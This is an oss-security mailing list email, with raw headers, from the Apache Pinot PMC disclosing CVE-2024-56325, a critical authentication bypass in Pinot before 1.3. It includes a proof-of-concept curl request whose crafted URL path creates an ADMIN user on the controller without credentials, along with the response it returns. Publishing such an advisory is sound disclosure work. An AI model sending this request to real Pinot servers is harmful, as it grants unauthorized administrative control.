Received: (qmail 5885 invoked by uid 550); 27 Mar 2025 17:57:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 19526 invoked from network); 27 Mar 2025 11:34:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1743075281; x=1743680081; darn=lists.openwall.com;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=fhz1/eWqDMChIhiB+Rk6/RHlDU2QbVkpQd4LxDTQoTs=;
        b=X6JVhNOiteIsREh9Jv6lgGRvcrY0g9Ti5btl+2dKXLN8CUtH9cpW0WpYZz5DPszYTm
         G9ArCtwBXShD2vKGu0vIuyjFqLOUcjRr/rcC7yMlwEgPbPiJ96XOzvrzt8cm3b7DgN7g
         jrMAzLg96nOKNfxr10ug747hE66/V34t9ChstamdgIE6PJ8bnEa0zAQZCyS01VRib1NY
         NOPz212NgUmrn0CRB0TXXrKbdCRoTFohmzjfhuLu7Z0qOYofXx2HA+20IohJWwCc6a9h
         3LoT1cc4oPcc27Cn1jSqI8CIGfyGiBDrUrmOSov3paJRrsnVhBTqCxDYf7Hbbh7GzWzF
         M42A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1743075281; x=1743680081;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=fhz1/eWqDMChIhiB+Rk6/RHlDU2QbVkpQd4LxDTQoTs=;
        b=sxcNXQUG7mTViWQSpWtpESA1bDGROk9qcU0OD8apvyPXDYrz1NFBy749sA06YbDRX3
         hIFTMuoJus+5/KXUe87jiogwX1460QlfNZY1Ju0XzOdRbwE1PmfuyVNJxJA7LGGgRsox
         dZwGkIVRE2SeEqEi/yrTjHjUkKf+NsySDETEQXx7C9IwE+1CaMz/mRqgrLSHD4mrRxJ2
         Ol7TLpJt07eLJm3IzrOGZcHFBb0dKvC9pn3DdFDW6iYAZKffl4tlq1ZwMt6pKQM7gksB
         97SdPKewcrAKE8ufuWdSuAeWy7dpXCzejmirTzeMiQISJA4Mp2ueEts26zjVJEXcQ+h/
         kjXA==
X-Gm-Message-State: AOJu0YwHNJhP1hQhh7loej1svsvYNwJRf+c/Ra6ZsT5i7kwZx/2JJfI6
	8JCA8Kqt4If1lfKJa0fyjjzUUhm5oYg8UR+Ww+kdgAGSHo6ZiD3TqDpKPwcWUaC/b4ZYukJLsTe
	yBp0U1uXMJrfMcf7EwZs5RgnzAaQw/pPJ
X-Gm-Gg: ASbGncvSroa1nGbp0X43SOlDgGLDWOMpTfQpYvWJ553+K4Icu10+yVwvxHLiFoPxnYn
	DQLNifmPwU5yJGWoP2jz48B8FNzO5cf6GFE+bheB/NlDOgXeJ60w7wOSR/+L53g1HnjwjduGqT0
	IAtbfRTcMEL1Wagt43X0MJcEK3WbVB4F/16syXIPqc3V7mxe13JZ0AhvvAhg==
X-Google-Smtp-Source: AGHT+IH2fJYEnwaJOJAFfHRwiDWP66VScxYu3lBT2iFaQvtlJ2AJGx13ddhybdmV3HkkkF6vJNiTq2EtGdoo78DoSMI=
X-Received: by 2002:a05:690c:10c:b0:6ee:b726:62cd with SMTP id
 00721157ae682-70225166a6amr21334607b3.9.1743075280671; Thu, 27 Mar 2025
 04:34:40 -0700 (PDT)
MIME-Version: 1.0
From: siddharth teotia <siddharthteotia@gmail.com>
Date: Thu, 27 Mar 2025 04:34:29 -0700
X-Gm-Features: AQ5f1JrsS-UQp9jEkqNioXgtyA2LqsPf0vLHQfTUU6-kJpZj9rrZ_L5-dvPYxBw
Message-ID: <CAJw6sH1FZTzhoYL3NJDmE6K2zvi-QXYsnakZYcELZHmMZe-m0w@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: dev@pinot.apache.org, Apache Security Team <security@apache.org>, 
	zdi-disclosures@trendmicro.com
Content-Type: multipart/alternative; boundary="000000000000ebdb8206315156aa"
Subject: [oss-security] CVE-2024-56325: Apache Pinot: Authentication bypass issue. If the
 path does not contain / and contain . authentication is not required

--000000000000ebdb8206315156aa
Content-Type: text/plain; charset="UTF-8"

*Severity:* critical
*Affected versions:*

- Apache Pinot before 1.3
*Description:*

Authentication Bypass Issue

If the path does not contain / and contain., authentication is not required.
*Expected Normal Request and Response Example*

curl -X POST -H "Content-Type: application/json" -d
{\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}
 http://{server_ip}:9000/users

Return: {"code":401,"error":"HTTP 401 Unauthorized"}
*Malicious Request and Response Example*

curl -X POST -H "Content-Type: application/json" -d
'{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'
 http://{serverip}:9000/users; http://{serverip}:9000/users; .

Return: {"users":{}}

A new user gets added bypassing authentication, enabling the user to
control Pinot.

References:https://www.cve.org/CVERecord?id=CVE-2024-56325

Thanks

Siddharth (Apache Pinot PMC)

--000000000000ebdb8206315156aa--
